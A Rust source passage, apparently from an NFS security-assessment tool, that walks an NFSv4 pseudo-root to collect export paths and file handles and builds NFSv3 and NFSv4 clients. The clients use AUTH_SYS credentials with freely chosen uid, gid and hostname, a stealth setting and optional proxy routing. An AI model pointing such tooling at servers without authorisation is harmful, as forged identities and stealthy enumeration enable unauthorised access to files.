    tracing::debug!(root_fsid = ?root_fsid, root_fh_len = root_fh.len(), "gather_v4: pseudo-root acquired");

    let mut results: Vec<(String, FileHandle)> = Vec::new();
    let mut stack: Vec<(Vec<u8>, (u64, u64), String, u32)> = vec![(root_fh, root_fsid, String::new(), 0)];
    let mut visited = 0u32;

    while let Some((dir_fh, parent_fsid, prefix, depth)) = stack.pop() {
        if depth > 10 {
            continue;
        }
        visited += 1;
        if visited > 200 {
            break;
        }

        let Ok(entries) = client.list_dir(&dir_fh).await else { continue };
        let children: Vec<&String> = entries.iter().filter(|n| *n != "." && *n != "..").take(10).collect();

        for name in children {
            let Ok((child_fh, child_info)) = client.lookup(dir_fh.as_slice(), name).await else { continue };
            let child_fsid = child_info.fsid.unwrap_or(parent_fsid);
            let child_path = if prefix.is_empty() { format!("/{name}") } else { format!("{prefix}/{name}") };

            if child_fsid != parent_fsid {
                if let Ok(export_entries) = client.list_dir(&child_fh).await {
                    for child_name in export_entries.iter().filter(|n| *n != "." && *n != "..") {
                        if let Ok((inner_fh, _)) = client.lookup(child_fh.as_slice(), child_name).await {
                            results.push((child_path.clone(), FileHandle::from_bytes(&inner_fh)));
                            break;
                        }
                    }
                }
                results.push((child_path, FileHandle::from_bytes(&child_fh)));
            } else if child_info.ftype == Some(nfs_v4::Nfs4FileType::Directory) {
                stack.push((child_fh, parent_fsid, child_path, depth + 1));
            }
        }
    }
    results
}

// =============================================================================
// Client construction helpers
// =============================================================================

/// Build an NFSv3 pooled client with the global credentials.
fn make_v3_client(addr: SocketAddr, export: &str, stealth: StealthConfig, nfs_port: u16, globals: &GlobalOpts) -> Nfs3Client {
    let (_, _, client) = make_client_with_hostname(addr, export, globals.uid, globals.gid, &globals.aux_gids, stealth, globals.proxy.as_deref(), Some(nfs_port), &globals.hostname);
    client
}

/// Build an NFSv4 pool-free direct client for probes and traversal.
async fn make_v4_direct_client(addr: SocketAddr, globals: &GlobalOpts) -> anyhow::Result<crate::proto::nfs4::compound::Nfs4DirectClient> {
    use crate::proto::nfs4::compound::Nfs4DirectClient;
    match Nfs4DirectClient::connect_with_auth_proxy(addr, globals.uid, globals.gid, &globals.hostname, globals.proxy.as_deref()).await {
        Ok(c) => Ok(c),
        Err(_) => Nfs4DirectClient::connect_proxy(addr, globals.proxy.as_deref()).await,
    }
}

/// Build an NFSv4 pooled client (for Phase 3 probing and Phase 4b listing).
fn make_v4_pooled_client(addr: SocketAddr, export: &str, stealth: StealthConfig, nfs_port: u16, globals: &GlobalOpts) -> crate::proto::nfs4::Nfs4Client {
    use crate::proto::nfs4::Nfs4Client as PooledNfs4Client;

    let pool = Arc::new(match &globals.proxy {
        Some(p) => ConnectionPool::with_proxy(p.clone()),
        None => ConnectionPool::default_config(),
    });
    let circuit = Arc::new(CircuitBreaker::default_config());
    let gids = build_gid_list(globals.gid, &globals.aux_gids);
    let cred = Credential::Sys(AuthSys::with_groups(globals.uid, globals.gid, &gids, &globals.hostname));
    let pool_key = PoolKey { host: addr, export: format!("__v4_probe__{export}__{nfs_port}"), uid: globals.uid, gid: globals.gid };
    let transport = PooledTransport::new_direct(pool, pool_key, circuit, stealth, cred, ReconnectStrategy::Persistent, nfs_port);
    PooledNfs4Client::new(transport)
}
